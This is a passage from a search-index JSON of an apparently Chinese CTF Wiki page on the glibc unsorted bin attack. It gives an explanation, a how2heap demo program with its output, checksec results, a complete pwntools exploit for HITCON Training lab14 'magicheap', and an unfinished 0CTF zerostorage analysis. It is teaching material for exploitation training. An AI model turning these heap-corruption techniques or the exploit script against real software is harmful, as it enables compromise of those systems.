Free\u3002\n\n\n\u5229\u7528\u6d41\u7a0b\n\n\n\u3002\u3002\u3002\u3002\n\n\n\u9898\u76ee\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttp://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/\n\n\nhttps://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage\n\n\nhttps://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py", 
            "title": "Unsorted Bin Attack"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#unsorted-bin-attack", 
            "text": "", 
            "title": "Unsorted Bin Attack"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_1", 
            "text": "Unsorted Bin Attack\uff0c\u987e\u540d\u601d\u4e49\uff0c\u8be5\u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Unsorted Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002  Unsorted Bin Attack \u88ab\u5229\u7528\u7684\u524d\u63d0\u662f\u63a7\u5236 Unsorted Bin Chunk \u7684 bk \u6307\u9488\u3002  Unsorted Bin Attack \u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u662f\u5b9e\u73b0\u4fee\u6539\u4efb\u610f\u5730\u5740\u503c\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u6570\u503c\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#unsorted-bin", 
            "text": "\u5728\u4ecb\u7ecd Unsorted Bin \u653b\u51fb\u524d\uff0c\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b Unsorted Bin \u7684\u57fa\u672c\u6765\u6e90\u4ee5\u53ca\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\u3002", 
            "title": "Unsorted Bin \u56de\u987e"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_2", 
            "text": "\u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002  \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8etop chunk\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002  \u5f53\u8fdb\u884c malloc_consolidate \u65f6\uff0c\u53ef\u80fd\u4f1a\u628a\u5408\u5e76\u540e\u7684 chunk \u653e\u5230 unsorted bin \u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u548c top chunk \u8fd1\u90bb\u7684\u8bdd\u3002", 
            "title": "\u57fa\u672c\u6765\u6e90"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_3", 
            "text": "Unsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO\uff0c \u5373\u63d2\u5165\u7684\u65f6\u5019\u63d2\u5165\u5230 unsorted bin \u7684\u5934\u90e8\uff0c\u53d6\u51fa\u7684\u65f6\u5019\u4ece\u94fe\u8868\u5c3e\u83b7\u53d6 \u3002  \u5728\u7a0b\u5e8f malloc \u65f6\uff0c\u5982\u679c\u5728 fastbin\uff0csmall bin \u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u5927\u5c0f\u7684 chunk\uff0c\u5c31\u4f1a\u5c1d\u8bd5\u4ece Unsorted Bin \u4e2d\u5bfb\u627e chunk\u3002\u5982\u679c\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u521a\u597d\u6ee1\u8db3\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5426\u5219\u5c31\u4f1a\u628a\u8fd9\u4e9b chunk \u5206\u522b\u63d2\u5165\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002", 
            "title": "\u57fa\u672c\u4f7f\u7528\u60c5\u51b5"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_4", 
            "text": "\u8fd9\u91cc\u6211\u4ee5 shellfish \u7684 how2heap \u4ed3\u5e93\u4e2d\u7684  unsorted_bin_attack.c  \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u6211\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5982\u4e0b  #include   stdio.h  #include   stdlib.h  int   main ()   { \n   fprintf ( stderr ,   This file demonstrates unsorted bin attack by write a large  \n                   unsigned long value into stack \\n ); \n   fprintf ( \n       stderr , \n       In practice, unsorted bin attack is generally prepared for further  \n       attacks, such as rewriting the  \n       global variable global_max_fast in libc for further fastbin attack \\n\\n ); \n\n   unsigned   long   target_var   =   0 ; \n   fprintf ( stderr , \n           Let s first look at the target we want to rewrite on stack: \\n ); \n   fprintf ( stderr ,   %p: %ld \\n\\n ,   target_var ,   target_var ); \n\n   unsigned   long   * p   =   malloc ( 400 ); \n   fprintf ( stderr ,   Now, we allocate first normal chunk on the heap at: %p \\n , \n           p ); \n   fprintf ( stderr ,   And allocate another normal chunk in order to avoid  \n                   consolidating the top chunk with \n                   the first one during the free() \\n\\n ); \n   malloc ( 500 ); \n\n   free ( p ); \n   fprintf ( stderr ,   We free the first chunk now and it will be inserted in the  \n                   unsorted bin with its bk pointer  \n                   point to %p \\n , \n           ( void   * ) p [ 1 ]); \n\n   /*------------VULNERABILITY-----------*/ \n\n   p [ 1 ]   =   ( unsigned   long )( target_var   -   2 ); \n   fprintf ( stderr ,   Now emulating a vulnerability that can overwrite the  \n                   victim- bk pointer \\n ); \n   fprintf ( stderr ,   And we write it with the target address-16 (in 32-bits  \n                   machine, it should be target address-8):%p \\n\\n , \n           ( void   * ) p [ 1 ]); \n\n   //------------------------------------ \n\n   malloc ( 400 ); \n   fprintf ( stderr ,   Let s malloc again to get the chunk we just free. During  \n                   this time, target should has already been  \n                   rewrite: \\n ); \n   fprintf ( stderr ,   %p: %p \\n ,   target_var ,   ( void   * ) target_var );  }   \u7a0b\u5e8f\u6267\u884c\u540e\u7684\u6548\u679c\u4e3a  \u279c  unsorted_bin_attack git: ( master )  \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack   \n\u279c  unsorted_bin_attack git: ( master )  \u2717 ./unsorted_bin_attack\nThis file demonstrates unsorted bin attack by write a large unsigned long value into stack\nIn practice, unsorted bin attack is generally prepared  for  further attacks, such as rewriting the global variable global_max_fast in libc  for  further fastbin attack\n\nLet s first look at the target we want to rewrite on stack:  0x7ffe0d232518: 0  Now, we allocate first normal chunk on the heap at: 0x1fce010  And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()  We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78  Now emulating a vulnerability that can overwrite the victim- bk pointer  And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508  Let s malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n0x7ffe0d232518: 0x7f1c705ffb78  \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fe\u6765\u63cf\u8ff0\u4e00\u4e0b\u5177\u4f53\u53d1\u751f\u7684\u6d41\u7a0b\u4ee5\u53ca\u80cc\u540e\u7684\u539f\u7406\u3002   \u521d\u59cb\u72b6\u6001\u65f6  unsorted bin \u7684 fd \u548c bk \u5747\u6307\u5411 unsorted bin \u672c\u8eab\u3002  \u6267\u884cfree(p)    \u7531\u4e8e\u91ca\u653e\u7684 chunk \u5927\u5c0f\u4e0d\u5c5e\u4e8e fast bin \u8303\u56f4\u5185\uff0c\u6240\u4ee5\u4f1a\u9996\u5148\u653e\u5165\u5230 unsorted bin \u4e2d\u3002  \u4fee\u6539p[1]  \u7ecf\u8fc7\u4fee\u6539\u4e4b\u540e\uff0c\u539f\u6765\u5728 unsorted bin \u4e2d\u7684 p \u7684 bk \u6307\u9488\u5c31\u4f1a\u6307\u5411 target addr-16 \u5904\u4f2a\u9020\u7684 chunk\uff0c\u5373 Target Value \u5904\u4e8e\u4f2a\u9020 chunk \u7684 fd \u5904\u3002  \u7533\u8bf7400\u5927\u5c0f\u7684chunk  \u6b64\u65f6\uff0c\u6240\u7533\u8bf7\u7684 chunk \u5904\u4e8e small bin \u6240\u5728\u7684\u8303\u56f4\uff0c\u5176\u5bf9\u5e94\u7684 bin \u4e2d\u6682\u65f6\u6ca1\u6709 chunk\uff0c\u6240\u4ee5\u4f1a\u53bbunsorted bin\u4e2d\u627e\uff0c\u53d1\u73b0 unsorted bin \u4e0d\u7a7a\uff0c\u4e8e\u662f\u628a unsorted bin \u4e2d\u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u3002           while   (( victim   =   unsorted_chunks ( av ) - bk )   !=   unsorted_chunks ( av ))   { \n             bck   =   victim - bk ; \n             if   ( __builtin_expect ( chunksize_nomask ( victim )   =   2   *   SIZE_SZ ,   0 )   || \n                 __builtin_expect ( chunksize_nomask ( victim )     av - system_mem ,   0 )) \n                 malloc_printerr ( check_action ,   malloc(): memory corruption , \n                                 chunk2mem ( victim ),   av ); \n             size   =   chunksize ( victim ); \n\n             /*                 If a small request, try to use last remainder if it is the                 only chunk in unsorted bin.  This helps promote locality for                 runs of consecutive small requests. This is the only                 exception to best-fit, and applies only when there is                 no exact fit for a small chunk.               */ \n             /* \u663e\u7136\uff0cbck\u88ab\u4fee\u6539\uff0c\u5e76\u4e0d\u7b26\u5408\u8fd9\u91cc\u7684\u8981\u6c42*/ \n             if   ( in_smallbin_range ( nb )     bck   ==   unsorted_chunks ( av )   \n                 victim   ==   av - last_remainder   \n                 ( unsigned   long )   ( size )     ( unsigned   long )   ( nb   +   MINSIZE ))   { \n                 .... \n             } \n\n             /* remove from unsorted list */ \n             unsorted_chunks ( av ) - bk   =   bck ; \n             bck - fd                   =   unsorted_chunks ( av );    victim = unsorted_chunks(av)- bk=p  bck = victim- bk=p- bk = target addr-16  unsorted_chunks(av)- bk = bck=target addr-16  bck- fd                 = *(target addr -16+16) = unsorted_chunks(av);   \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06 unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u7684\u8fc7\u7a0b\u4e2d\uff0cvictim \u7684 fd \u5e76\u6ca1\u6709\u53d1\u6325\u4f5c\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u6211\u4eec\u4fee\u6539\u4e86\u5176\u4e3a\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u503c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002 \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cunsorted bin \u94fe\u8868\u53ef\u80fd\u5c31\u6b64\u7834\u574f\uff0c\u5728\u63d2\u5165 chunk \u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002  \u5373\u4fee\u6539 target \u5904\u7684\u503c\u4e3a unsorted bin \u7684\u94fe\u8868\u5934\u90e8 0x7f1c705ffb78\uff0c\u4e5f\u5c31\u662f\u4e4b\u524d\u8f93\u51fa\u7684\u4fe1\u606f\u3002  We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78\nNow emulating a vulnerability that can overwrite the victim- bk pointer\nAnd we write it with the target address-16  ( in  32 -bits machine, it should be target address-8 ) :0x7ffe0d232508\n\nLet s malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n0x7ffe0d232518: 0x7f1c705ffb78  \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 unsorted bin attack \u786e\u5b9e\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u6240\u4fee\u6539\u6210\u7684\u503c\u5374\u4e0d\u53d7\u6211\u4eec\u63a7\u5236\uff0c\u552f\u4e00\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u6bd4\u8f83\u5927\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c  \u8fd9\u770b\u8d77\u6765\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u662f\u5176\u5b9e\u8fd8\u662f\u6709\u70b9\u5375\u7528\u7684\uff0c\u6bd4\u5982\u8bf4   \u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5faa\u73af\u7684\u6b21\u6570\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u591a\u6b21\u5faa\u73af\u3002  \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 heap \u4e2d\u7684 global_max_fast \u6765\u4f7f\u5f97\u66f4\u5927\u7684 chunk \u53ef\u4ee5\u88ab\u89c6\u4e3a fast bin\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u53bb\u6267\u884c\u4e00\u4e9b fast bin attack\u4e86\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#hitcon-training-lab14-magic-heap", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684 l33t \u51fd\u6570\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002  void   l33t ()   {   system ( cat ./flag );   }", 
            "title": "HITCON Training lab14 magic heap"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_5", 
            "text": "\u279c  hitcontraining_lab14 git: ( master )  file magicheap \nmagicheap: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped\n\u279c  hitcontraining_lab14 git: ( master )  checksec magicheap  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u768464\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4e0e Canary \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_6", 
            "text": "\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u81ea\u5df1\u5199\u7684\u5806\u7ba1\u7406\u5668\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd   \u521b\u5efa\u5806\u3002\u6839\u636e\u7528\u6237\u6307\u5b9a\u5927\u5c0f\u7533\u8bf7\u76f8\u5e94\u5806\uff0c\u5e76\u4e14\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002  \u7f16\u8f91\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u6839\u636e\u7528\u6237\u8bfb\u5165\u7684\u5927\u5c0f\uff0c\u6765\u4fee\u6539\u5806\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002  \u5220\u9664\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u5c06\u5bf9\u5e94\u5806\u91ca\u653e\u5e76\u7f6e\u4e3a NULL\u3002   \u540c\u65f6\uff0c\u6211\u4eec\u770b\u5230\uff0c\u5f53\u6211\u4eec\u63a7\u5236 v3 \u4e3a 4869\uff0c\u540c\u65f6\u63a7\u5236 magic \u5927\u4e8e 4869\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_7", 
            "text": "\u5f88\u663e\u7136\uff0c \u6211\u4eec\u76f4\u63a5\u5229\u7528 unsorted bin attack \u5373\u53ef\u3002   \u91ca\u653e\u4e00\u4e2a\u5806\u5757\u5230 unsorted bin \u4e2d\u3002  \u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539 unsorted bin \u4e2d\u5bf9\u5e94\u5806\u5757\u7684 bk \u6307\u9488\u4e3a  magic-16\u3002  \u89e6\u53d1\u6f0f\u6d1e\u5373\u53ef\u3002   \u4ee3\u7801\u5982\u4e0b  #!/usr/bin/env python  # -*- coding: utf-8 -*-  from   pwn   import   *  r   =   process ( ./magicheap )  def   create_heap ( size ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 1 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( size )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   edit_heap ( idx ,   size ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 2 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx )) \n     r . recvuntil ( : ) \n     r . sendline ( str ( size )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   del_heap ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 3 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  create_heap ( 0x20 ,   dada )    # 0  create_heap ( 0x80 ,   dada )    # 1  # in order not to merge into top chunk  create_heap ( 0x20 ,   dada )    # 2  del_heap ( 1 )  magic   =   0x6020c0  fd   =   0  bk   =   magic   -   0x10  edit_heap ( 0 ,   0x20   +   0x20 ,   a   *   0x20   +   p64 ( 0 )   +   p64 ( 0x91 )   +   p64 ( fd )   +   p64 ( bk ))  create_heap ( 0x80 ,   dada )    #trigger unsorted bin attack  r . recvuntil ( : )  r . sendline ( 4869 )  r . interactive ()", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#2016-0ctf-zerostorage-", 
            "text": "\u6ce8\uff1a\u5f85\u8fdb\u4e00\u6b65\u5b8c\u6210\u3002  \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 0CTF \u7684zerostorage\u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002  \u8fd9\u4e2a\u9898\u5f53\u65f6\u7ed9\u4e86\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u7248\u672c\u548c\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u81ea\u5df1\u53ef\u4ee5\u4e0b\u4e00\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u8fdb\u884c\u8c03\u8bd5\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u7528\u81ea\u5df1\u7684\u672c\u5730\u673a\u5668\u8c03\u8bd5\u4e86\u3002\u4f46\u662f\u5728\u76ee\u524d\u7684Ubuntu 16.04 \u4e2d\uff0c\u7531\u4e8e\u8fdb\u4e00\u6b65\u7684\u968f\u673a\u5316\uff0c\u5bfc\u81f4 libc \u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e0e\u7a0b\u5e8f\u6a21\u5757\u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u76f8\u5bf9\u504f\u79fb\u4e0d\u518d\u56fa\u5b9a\uff0c\u6240\u4ee5 BrieflyX \u7684\u7b56\u7565\u5c31\u65e0\u6cd5\u518d\u6b21\u4f7f\u7528\uff0c\u4f3c\u4e4e\u53ea\u80fd\u7528 angelboy \u7684\u7b56\u7565\u4e86\u3002", 
            "title": "2016 0CTF zerostorage-\u5f85\u5b8c\u6210"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_8", 
            "text": "\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u5f00\u542f\u4e86\u6240\u6709\u7684\u4fdd\u62a4  pwndbg  checksec  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage \n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled", 
            "title": "\u5b89\u5168\u6027\u68c0\u67e5"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_9", 
            "text": "\u7a0b\u5e8f\u7ba1\u7406\u5728 bss \u6bb5\u7684\u5b58\u50a8\u7a7a\u95f4 storage \uff0c\u5177\u6709\u63d2\u5165\uff0c\u5220\u9664\uff0c\u5408\u5e76\uff0c\u5220\u9664\uff0c\u67e5\u770b\uff0c\u679a\u4e3e\uff0c\u9000\u51fa\u529f\u80fd\u3002\u8fd9\u4e2astorage\u7684\u7ed3\u6784\u4f53\u5982\u4e0b  00000000 Storage         struc ; (sizeof=0x18, mappedto_7)\n00000000                                         ; XREF: .bss:storage_list/r\n00000000 use             dq ?\n00000008 size            dq ?\n00000010 xor_addr        dq ?\n00000018 Storage         ends", 
            "title": "\u57fa\u672c\u529f\u80fd\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#insert-1", 
            "text": "\u57fa\u672c\u529f\u80fd\u5982\u4e0b   \u9010\u4e00\u67e5\u770b storage \u6570\u7ec4\uff0c\u67e5\u627e\u7b2c\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u5143\u7d20\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u7ec4\u6700\u5927\u4e5f\u5c31\u662f32\u3002  \u8bfb\u53d6storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002  \u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b  \u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b  \u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b  \u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002    \u4f7f\u7528 calloc \u5206\u914d\u6307\u5b9a\u957f\u5ea6\uff0c\u6ce8\u610f calloc \u4f1a\u521d\u59cb\u5316 chunk \u4e3a0\u3002  \u5c06 calloc \u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u4e0e bss \u6bb5\u7684\u4e00\u4e2a\u5185\u5b58\uff08\u521d\u59cb\u65f6\u523b\u4e3a\u4e00\u4e2a\u968f\u673a\u6570\uff09\u8fdb\u884c\u6291\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u5185\u5b58\u5730\u5740\u3002  \u6839\u636e\u8bfb\u53d6\u7684storage\u7684\u5927\u5c0f\u6765\u8bfb\u5165\u5185\u5bb9\u3002  \u5c06\u5bf9\u5e94\u7684storage\u7684\u5927\u5c0f\u4ee5\u53ca\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u4fdd\u5b58\u5230\u5bf9\u5e94\u7684storage \u5143\u7d20\u4e2d\uff0c\u5e76\u6807\u8bb0\u8be5\u5143\u7d20\u5904\u4e8e\u53ef\u7528\u72b6\u6001\u3002 \u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bb0\u5f55\u7684storage\u7684\u5927\u5c0f\u662f\u81ea\u5df1\u8f93\u5165\u7684\u5927\u5c0f\uff01\uff01\uff01  \u9012\u589e storage num\u7684\u6570\u91cf\u3002", 
            "title": "insert-1"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#update-2", 
            "text": "\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5b58\u50a8\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u5165\u8981\u66f4\u65b0\u7684storage\u5143\u7d20\u7684id\uff0c\u5982\u679cid\u5927\u4e8e31\u6216\u8005\u76ee\u524d\u5904\u4e8e\u4e0d\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u8bf4\u660e\u4e0d\u5bf9\uff0c\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u53d6 \u66f4\u65b0\u540e storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002  \u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b  \u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b  \u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b  \u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002    \u6839\u636e bss \u6bb5\u5bf9\u5e94\u7684\u968f\u673a\u6570\u83b7\u53d6\u539f\u5148storage \u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\uff0c  \u5982\u679c\u66f4\u65b0\u540e\u6240\u9700\u7684\u957f\u5ea6\u4e0d\u7b49\u4e8e\u66f4\u65b0\u524d\u7684\u957f\u5ea6\uff0c\u5c31\u4f7f\u7528realloc\u4e3a\u5176\u91cd\u65b0\u5206\u914d\u5185\u5b58\u3002  \u518d\u6b21\u8bfb\u53d6\u6570\u636e\uff0c\u540c\u65f6\u66f4\u65b0storage \u5143\u7d20\u3002", 
            "title": "update-2"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#merge-3", 
            "text": "\u5982\u679c\u6b63\u5728\u4f7f\u7528\u7684\u5143\u7d20\u4e0d\u5927\u4e8e1\u4e2a\uff0c\u90a3\u4e48\u65e0\u6cd5\u5408\u5e76\uff0c\u76f4\u63a5\u9000\u51fa\u5373\u53ef\u3002  \u5224\u65adstorage\u662f\u5426\u5df2\u7ecf\u6ee1\u4e86\uff0c\u5982\u679c\u4e0d\u6ee1\uff0c\u627e\u51fa\u7a7a\u95f2\u7684\u90a3\u4e00\u5757\u3002  \u5206\u522b\u8bfb\u53d6merge_from\u7684id\u4ee5\u53camerge_to\u7684id\u53f7\uff0c\u5e76\u8fdb\u884c\u76f8\u5e94\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u7684\u68c0\u6d4b\u3002  \u6839\u636e\u6700\u521d\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u8ba1\u7b97\u4e24\u4e2a merge \u5230\u4e00\u8d77\u540e\u6240\u9700\u8981\u7684\u7a7a\u95f4\uff0c \u5982\u679c\u4e0d\u5927\u4e8e128\uff0c\u90a3\u5c31\u4e0d\u4f1a\u7533\u8bf7\u65b0\u7684\u7a7a\u95f4 \uff0c\u5426\u5219\u5c31\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684\u65b0\u7684\u7a7a\u95f4\u3002  \u4f9d\u6b21\u5c06merge_to\u4e0emerge_from\u7684\u5185\u5bb9\u62f7\u8d1d\u5230\u76f8\u5bf9\u5e94\u7684\u4f4d\u7f6e\u3002  \u6700\u540e\u5b58\u50a8merge_from\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u88ab\u91ca\u653e\u4e86\uff0c\u4f46\u5e76\u6ca1\u6709\u88ab\u7f6e\u4e3aNULL\u3002\u540c\u65f6\uff0c\u5b58\u653emerge_to\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u5e76\u6ca1\u6709\u88ab\u91ca\u653e\uff0c\u76f8\u5e94\u7684storage\u7684\u6291\u6216\u540e\u7684\u5730\u5740\u53ea\u662f\u88ab\u7f6e\u4e3a\u4e86NULL\u3002   \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u5728merge\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u4e24\u4e2astorage\u7684ID\u662f\u5426\u76f8\u540c\u3002", 
            "title": "merge-3"
